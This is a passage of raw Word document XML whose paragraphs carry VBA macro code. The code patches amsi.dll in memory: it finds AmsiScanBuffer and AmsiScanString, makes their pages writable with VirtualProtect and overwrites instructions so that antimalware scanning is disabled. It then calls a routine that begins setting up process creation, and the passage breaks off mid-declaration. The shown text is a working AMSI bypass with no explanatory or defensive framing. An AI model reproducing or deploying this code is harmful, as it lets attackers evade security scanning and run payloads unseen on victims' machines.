          <w:p w14:paraId="7AF690F5" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Success = 0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6023F96B" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F2465CC" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>LeakedAmsiDllAddr = LoadDll("amsi.dll", "AmsiUacInitialize")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12621A7B" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="589E8C37" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>LeakedBytesBuffer = GetBuffer(LeakedAmsiDllAddr, TrvOffset)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55760846" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C284DA8" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>InstructionInStringOffset = InStr(LeakedBytesBuffer, ScanBufferMagicBytes)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2137F2E9" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>If InstructionInStringOffset = 0 Then</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A6E960E" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    ' MsgBox "We didn't find the scanbuffer magicbytes :/"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F7F86E0" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A663FE0" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    AmsiScanBufferPatchAddr = FindPatchOffset(LeakedAmsiDllAddr, TrvOffset, InstructionInStringOffset)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FAD61FF" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59954382" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    Debug.Print Hex(AmsiScanBufferPatchAddr)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E4BC431" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BB27034" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    Result = VirtualProtect(ByVal AmsiScanBufferPatchAddr, 32, 64, 0)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17876405" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    ByteSwapper ByVal (AmsiScanBufferPatchAddr + 0), 1, Val("&amp;H" &amp; "90")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4014C139" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    ByteSwapper ByVal (AmsiScanBufferPatchAddr + 1), 1, Val("&amp;H" &amp; "31")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77458464" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    ByteSwapper ByVal (AmsiScanBufferPatchAddr + 2), 1, Val("&amp;H" &amp; "C0")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40F4E49E" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    Success = Success + 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DF357A5" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>End If</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B760B0A" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A925E05" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>InstructionInStringOffset = InStr(LeakedBytesBuffer, ScanStringMagicBytes)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C2DA20F" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>If InstructionInStringOffset = 0 Then</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DAEF4C9" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    ' MsgBox "We didn't find the scanstring magicbytes :/"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BF1ACF7" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="318579F1" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    AmsiScanStringPatchAddr = FindPatchOffset(LeakedAmsiDllAddr, TrvOffset, InstructionInStringOffset)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68A3CFEA" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F6C3B24" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    Debug.Print Hex(AmsiScanStringPatchAddr)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2625CCF0" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1333EC94" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    Result = VirtualProtect(ByVal AmsiScanStringPatchAddr, 32, 64, 0)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A07B7FE" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    ByteSwapper ByVal (AmsiScanStringPatchAddr + 0), 1, Val("&amp;H" &amp; "90")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="252A5707" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    ByteSwapper ByVal (AmsiScanStringPatchAddr + 1), 1, Val("&amp;H" &amp; "31")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64597385" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    ByteSwapper ByVal (AmsiScanStringPatchAddr + 2), 1, Val("&amp;H" &amp; "D2")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56B19633" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    Success = Success + 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75DBF70B" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>End If</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12A15D01" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5379BA84" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>If Success = 2 Then</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FF53AE8" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    Call CallMe</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DE1D821" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>End If</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C2D61F2" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="541379C6" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>End Sub</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A337A3F" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73E58A24" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="47F17D51" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1661582E" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Sub TestOfficeVersion()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F80A8B1" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75D448D1" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#If Win64 Then</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BFA74CE" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    Call x64_office</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="025FFED9" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#ElseIf Win32 Then</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37C06F9F" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    Call x32_office</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C8707B8" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#End If</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13401056" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BBF7BB3" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>End Sub</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BF94E4F" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="463DDCBA" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Sub CallMe()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E49B5F8" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">     </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CD6C23B" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim pInfo As PROCESS_INFORMATION</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55E65B27" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim sInfo As STARTUPINFO</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0143BB9E" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim sNull As String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E8144B6" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim lSuccess As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6035C951" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim lRetValue As Long</w:t>
            </w:r>
          </w:p>
